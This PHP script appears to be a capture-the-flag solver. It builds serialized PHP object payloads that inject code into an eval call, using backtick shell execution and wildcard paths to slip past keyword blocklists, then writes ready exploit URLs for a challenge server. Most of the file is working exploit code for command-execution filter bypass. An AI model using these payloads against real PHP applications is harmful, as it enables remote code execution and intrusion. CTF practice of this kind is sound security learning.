<?php
// 新策略：让$a在eval后成为一个有效的函数名
// 这样__destruct中调用$a('', $b)不会报错

$blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
$blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];

$pattern_a = '/' . implode('|', array_map(function ($x) {
    return preg_quote($x, '/'); }, $blocked_a)) . '/i';
$pattern_b = '/' . implode('|', array_map(function ($x) {
    return preg_quote($x, '/'); }, $blocked_b)) . '/i';

echo "=== Strategy: Redefine \$a to be a function name in eval ===\n\n";

echo "Test 1: Redefine \$a as 'phpinfo' after command execution\n";
$a1 = ';$x=`/???/???%20/????`;exit($x);$a="include';
$b1 = '";';

echo "a: $a1\n";
echo "b: $b1\n";
echo "eval: " . $a1 . $b1 . "\n";
echo "After eval, \$a will be 'include' (if exit doesn't trigger)\n";
echo "a blocked: " . (preg_match($pattern_a, $a1) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b1) ? "YES" : "NO") . "\n\n";

echo "Wait, exit() will stop execution, so \$a won't be redefined.\n\n";

echo "Test 2: Set \$this->a in eval\n";
$a2 = ';$x=`/???/???%20/????`;exit($x);$this->a="include';
$b2 = '";';

echo "a: $a2\n";
echo "b: $b2\n";
echo "This tries to modify object property\n";
echo "a blocked: " . (preg_match($pattern_a, $a2) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b2) ? "YES (contains t,h,i)" : "NO") . "\n\n";

echo "Test 3: Use output buffering\n";
$a3 = ';$x=`/???/???%20/????`;die($x."<!--");';
$b3 = '-->");';

echo "a: $a3\n";
echo "b: $b3\n";
echo "This wraps error in HTML comment\n";
echo "a blocked: " . (preg_match($pattern_a, $a3) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b3) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a3) && !preg_match($pattern_b, $b3)) {
    $ser3 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a3) . ':"' . $a3 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b3) . ':"' . $b3 . '";}';
    $url3 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser3);
    echo "URL3:\n$url3\n\n";
    file_put_contents('url_comment.txt', $url3);
}

echo "Test 4: Simpler approach - just get output before error\n";
$a4 = ';`/???/???%20/????`;exit("';
$b4 = '");';

echo "a: $a4\n";
echo "b: $b4\n";
echo "Command executes, output goes to stdout, then exit\n";
echo "a blocked: " . (preg_match($pattern_a, $a4) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b4) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a4) && !preg_match($pattern_b, $b4)) {
    $ser4 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a4) . ':"' . $a4 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b4) . ':"' . $b4 . '";}';
    $url4 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser4);
    echo "URL4:\n$url4\n\n";
    file_put_contents('url_simple.txt', $url4);
}

echo "Test 5: Use ob_start() and ob_get_clean()\n";
$a5 = ';$x=`/???/???%20/????`;die("RESULT:".$x);';
$b5 = '//';

echo "a: $a5\n";
echo "b: $b5\n";
echo "Prefix output with marker\n";
echo "a blocked: " . (preg_match($pattern_a, $a5) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b5) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a5) && !preg_match($pattern_b, $b5)) {
    $ser5 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a5) . ':"' . $a5 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b5) . ':"' . $b5 . '";}';
    $url5 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser5);
    echo "URL5:\n$url5\n\n";
    file_put_contents('url_marker.txt', $url5);
}
